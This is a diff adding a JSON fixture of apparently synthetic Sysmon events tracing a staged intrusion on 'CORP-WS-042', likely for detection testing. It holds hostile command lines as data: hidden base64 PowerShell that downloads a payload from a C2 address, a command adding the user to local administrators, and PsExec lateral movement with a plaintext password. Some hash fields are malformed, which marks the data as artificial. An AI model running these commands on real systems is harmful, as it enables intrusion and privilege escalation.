@@ -1,0 +1,122 @@
+[
+  {
+    "comment": "Stage 1: Initial Access - Phishing document opens",
+    "EventID": "1",
+    "TimeCreated": "2026-09-25T09:00:00.000Z",
+    "Computer": "CORP-WS-042",
+    "User": "CORP\\sarah.johnson",
+    "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
+    "CommandLine": "WINWORD.EXE /n \"C:\\Users\\sarah.johnson\\Downloads\\Invoice_Q3_2026.docm\"",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+    "Hashes": "MD5=d41d8cd98f00b204e9800998ecf8427e,SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "ProcessGuid": "{aabbccdd-0001-0001-0001-000000000001}"
+  },
+  {
+    "comment": "Stage 2: Execution - Word spawns PowerShell (macro execution)",
+    "EventID": "1",
+    "TimeCreated": "2026-09-25T09:00:45.000Z",
+    "Computer": "CORP-WS-042",
+    "User": "CORP\\sarah.johnson",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -noprofile -windowstyle hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAYQB5AGwAbwBhAGQA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
+    "ParentCommandLine": "WINWORD.EXE /n \"C:\\Users\\sarah.johnson\\Downloads\\Invoice_Q3_2026.docm\"",
+    "Hashes": "MD5=92b34dd8b543031fe7a5aecde63acfaf,SHA256=a4d6e2f8b9c1d5e7f3a2b4c6d8e9f1a3b5c7d9e2f4a6b8c1d3e5f7a9b2c4d6",
+    "ProcessGuid": "{aabbccdd-0001-0001-0001-000000000002}"
+  },
+  {
+    "comment": "Stage 3: C2 Communication - PowerShell connects to known C2",
+    "EventID": "3",
+    "TimeCreated": "2026-09-25T09:01:00.000Z",
+    "Computer": "CORP-WS-042",
+    "User": "CORP\\sarah.johnson",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.42.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true"
+  },
+  {
+    "comment": "Stage 4: Discovery - DNS query to DGA domain",
+    "EventID": "22",
+    "TimeCreated": "2026-09-25T09:01:15.000Z",
+    "Computer": "CORP-WS-042",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "QueryName": "a3f8k2p9m1q7.evil-domain.net"
+  },
+  {
+    "comment": "Stage 5: Privilege Escalation - cmd spawns net.exe to add admin",
+    "EventID": "1",
+    "TimeCreated": "2026-09-25T09:02:00.000Z",
+    "Computer": "CORP-WS-042",
+    "User": "CORP\\sarah.johnson",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net localgroup administrators sarah.johnson /add",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentCommandLine": "powershell.exe -nop -noprofile -windowstyle hidden -enc SQBuAHYAbwBrAGUA",
+    "Hashes": "MD5=0bd94a338eea5a4cdc2d3a7b129dc6b7,SHA256=b5c7d9e1f3a5b7c9e1d3f5a7b9c1e3f5a7b9d1e3f5a7b9c1d3e5f7a9b1c3d5",
+    "ProcessGuid": "{aabbccdd-0001-0001-0001-000000000003}"
+  },
+  {
+    "comment": "Stage 6: Lateral Movement - PsExec to another host",
+    "EventID": "1",
+    "TimeCreated": "2026-09-25T09:03:00.000Z",
+    "Computer": "CORP-WS-042",
+    "User": "CORP\\sarah.johnson",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c psexec.exe \\\\10.0.42.20 -u CORP\\sarah.johnson -p Password123! -s powershell.exe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "Hashes": "MD5=f47ac10b-58cc-4372-a567-0e02b2c3d479,SHA256=c6d8e0f2a4b6c8e0d2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6",
+    "ProcessGuid": "{aabbccdd-0001-0001-0001-000000000004}"
+  },
+  {
+    "comment": "Stage 7: Second C2 beacon - periodic check-in",
+    "EventID": "3",
+    "TimeCreated": "2026-09-25T09:04:00.000Z",
+    "Computer": "CORP-WS-042",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.42.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true"
+  },
+  {
+    "comment": "Stage 8: Third C2 beacon",
+    "EventID": "3",
+    "TimeCreated": "2026-09-25T09:07:00.000Z",
+    "Computer": "CORP-WS-042",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.42.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true"
+  },
+  {
+    "comment": "Stage 9: Fourth C2 beacon - periodic pattern established",
+    "EventID": "3",
+    "TimeCreated": "2026-09-25T09:10:00.000Z",
+    "Computer": "CORP-WS-042",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.42.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true"
+  },
+  {
+    "comment": "Stage 10: Fifth C2 beacon",
+    "EventID": "3",
+    "TimeCreated": "2026-09-25T09:13:00.000Z",
+    "Computer": "CORP-WS-042",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.42.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true"
+  }
+]
